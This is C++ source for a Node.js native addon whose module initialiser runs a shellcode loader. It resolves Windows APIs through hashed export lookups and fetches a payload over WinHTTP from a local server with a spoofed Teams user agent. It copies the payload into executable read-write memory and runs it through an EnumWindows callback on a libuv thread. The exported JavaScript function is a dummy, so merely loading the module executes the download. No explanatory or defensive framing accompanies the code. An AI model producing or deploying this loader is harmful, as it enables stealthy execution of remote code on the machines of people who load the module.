#include <windows.h>
#include <napi.h>
#include <stdio.h>
#include <winhttp.h>

#define D_API( x )  decltype( x ) * x;

#define H_API_VIRTUALALLOC              0xceb9b623628b5257

#define H_API_ENUMWINDOWS               0xe616e582a8fbde6

#define H_API_WINHTTPOPEN               0x5806ebaf83fa9eee
#define H_API_WINHTTPCONNECT            0xaebe3e383a7f5e1b
#define H_API_WINHTTPOPENREQUEST        0xea7a3b7f1d75380f
#define H_API_WINHTTPSENDREQUEST        0x98203b7f1d75387e
#define H_API_WINHTTPRECEIVERESPONSE    0x2a6075392c67dfa8
#define H_API_WINHTTPQUERYDATAAVAILABLE 0x28625427f60f3648
#define H_API_WINHTTPREADDATA           0xaf9ca6d87cefac2b
#define H_API_WINHTTPCLOSEHANDLE        0x28f17d0b0409a47e

#define domain   L"localhost"
#define uri      L"/a.b"
#define port     8000
using namespace Napi;

INT uv_thread_create(PSIZE_T tid, PVOID entry, PVOID arg);
extern "C" SIZE_T Hasher1(INT sz, LPSTR str);

INT StringLengthA(char* string22)
{
    int length = 0;
    int stringmax = 2000;
    while (length < stringmax) {
        if (string22[length] == 0x00) {
            break;
        }
        length++;
    }
    return length;
}

// Does not handle forwaders
void xGetProcAddr(PVOID pe, SIZE_T api_hash, PHANDLE api_addr)
{
    int* AddressOfFunctions = NULL;
    int* AddressOfNames = NULL;
    short* AddressOfNameOrdinals = NULL;
    char* export_name = NULL;

    PIMAGE_NT_HEADERS       nt = (PIMAGE_NT_HEADERS)(((PBYTE)(pe))+((PIMAGE_DOS_HEADER)pe)->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY dir = (PIMAGE_EXPORT_DIRECTORY)(((PBYTE)(pe)) + (&nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT])->VirtualAddress);

    AddressOfFunctions = (int*)(((PBYTE)(pe)) + dir->AddressOfFunctions);
    AddressOfNameOrdinals = (short*)(((PBYTE)(pe)) + dir->AddressOfNameOrdinals);
    AddressOfNames = (int*)(((PBYTE)(pe)) + dir->AddressOfNames);

    for (DWORD i = 0; i < dir->NumberOfNames; i++)
    {
        export_name = (PCHAR)(((PBYTE)(pe)) + AddressOfNames[i]);
        if (Hasher1(StringLengthA(export_name), export_name) == api_hash)
        {
            *api_addr = (HANDLE*)(((PBYTE)(pe)) + AddressOfFunctions[AddressOfNameOrdinals[i]]);
        }
    }
}

PVOID SaveToBuffer(PDWORD TotalSize) {

    if (!TotalSize) {
        return NULL;
    }

    D_API(WinHttpOpen);
    D_API(WinHttpConnect);
    D_API(WinHttpOpenRequest);
    D_API(WinHttpSendRequest);
    D_API(WinHttpReceiveResponse);
    D_API(WinHttpQueryDataAvailable);
    D_API(WinHttpReadData);
    D_API(WinHttpCloseHandle);

    PVOID winhttp = LoadLibraryExA("winhttp.dll", NULL, NULL);

    xGetProcAddr(winhttp, H_API_WINHTTPOPEN, (PHANDLE)&WinHttpOpen);
    xGetProcAddr(winhttp, H_API_WINHTTPCONNECT, (PHANDLE)&WinHttpConnect);
    xGetProcAddr(winhttp, H_API_WINHTTPOPENREQUEST, (PHANDLE)&WinHttpOpenRequest);
    xGetProcAddr(winhttp, H_API_WINHTTPSENDREQUEST, (PHANDLE)&WinHttpSendRequest);
    xGetProcAddr(winhttp, H_API_WINHTTPRECEIVERESPONSE, (PHANDLE)&WinHttpReceiveResponse);
    xGetProcAddr(winhttp, H_API_WINHTTPQUERYDATAAVAILABLE, (PHANDLE)&WinHttpQueryDataAvailable);
    xGetProcAddr(winhttp, H_API_WINHTTPREADDATA, (PHANDLE)&WinHttpReadData);
    xGetProcAddr(winhttp, H_API_WINHTTPCLOSEHANDLE, (PHANDLE)&WinHttpCloseHandle);

    HINTERNET hSession     = NULL, hConnect = NULL, hRequest = NULL;
    LPVOID    pBuffer      = NULL;
    BOOL      bResults     = FALSE;

    hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Teams/1.7.00.13456 Chrome/102.0.5005.197 Electron/19.1.8 Safari/537.36",
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );
    if (hSession) {
        hConnect = WinHttpConnect(hSession, domain, port, 0);
    }
    if (hConnect) {
        hRequest = WinHttpOpenRequest(hConnect, L"GET",uri, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, NULL);
    }

    // Send a request.
    if (hRequest) {
        bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    }

    // Receive a response.
    if (bResults) {
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    }

    // Keep checking for data until there is nothing left.
    if (bResults) {
        LPBYTE    lpTempBuffer = NULL;
        DWORD     dwSize       = 0;
        DWORD     dwDownloaded = 0;
        pBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1);
        do {
            // Check for available data.
            dwSize = 0;
            WinHttpQueryDataAvailable(hRequest, &dwSize);

            // Allocate space for the buffer.
            if (!dwSize) {
                break;
            }

            lpTempBuffer = (LPBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize + 1);
            RtlSecureZeroMemory(lpTempBuffer, dwSize + 1);
            WinHttpReadData(hRequest, lpTempBuffer, dwSize, &dwDownloaded);


            // Allocate/Reallocate buffer for total data
            pBuffer = (LPBYTE)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pBuffer, *TotalSize + dwDownloaded + 1);

            // Copy temp buffer to total buffer
            memcpy(((PBYTE)(pBuffer)) + *TotalSize, lpTempBuffer, dwDownloaded);

            // Free temp buffer
            HeapFree(GetProcessHeap(), 0, lpTempBuffer);

            *TotalSize += dwDownloaded;
        } while (dwSize > 0);
    }

    // Close any open handles.
    if (hRequest)
    {
        WinHttpCloseHandle(hRequest);
    }
    if (hConnect)
    {
        WinHttpCloseHandle(hConnect);

    }
    if (hSession)
    {
        WinHttpCloseHandle(hSession);
    }

    return pBuffer;
}

int bruh() {

    D_API(VirtualAlloc);

    PVOID k32 = GetModuleHandleA("kernel32.dll");

    xGetProcAddr(k32, H_API_VIRTUALALLOC, (PHANDLE)&VirtualAlloc);

    PVOID       downloadedShc    = NULL;
    DWORD       szDownload       = 0;
    PVOID       pBuffer          = NULL;

    downloadedShc = SaveToBuffer(&szDownload);

    pBuffer = VirtualAlloc((PVOID)0x7ffacf300000, szDownload, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    printf("size: 0x%x\n", szDownload);
    printf("addr: 0x%p\n", downloadedShc);
    printf("exec addr:0x%p\n", pBuffer);
    memcpy(pBuffer, downloadedShc, szDownload);

    ZeroMemory(downloadedShc, szDownload);
    HeapFree(GetProcessHeap(), NULL, downloadedShc);

    D_API(uv_thread_create);
    PVOID  EnumWindows = NULL;
    SIZE_T tid = 0;

    uv_thread_create = (int (*)(PSIZE_T tid, PVOID entry, PVOID arg)) GetProcAddress(GetModuleHandleA(NULL), "uv_thread_create");
    xGetProcAddr(LoadLibraryExA("user32.dll", NULL, NULL), H_API_ENUMWINDOWS, &EnumWindows);

    uv_thread_create(&tid, EnumWindows, pBuffer);

    return 0;
}

// Dummy function that can be called from javascript
void do_thing_from_node(const Napi::CallbackInfo& info) {
    return;
}

Napi::Object Init(Napi::Env env, Napi::Object exports) {

    // This (do_thing_from_node) is going to be callable from the javascript that loads this node via the js function "register_interfaces"
    exports.Set("register_interfaces", Napi::Function::New(env, do_thing_from_node));

    // This does the loader thing
    bruh();

    // Obligatory message box
    MessageBoxA(NULL, "bruh", "what", MB_OK);
    return exports;
}

NODE_API_MODULE(addon, Init)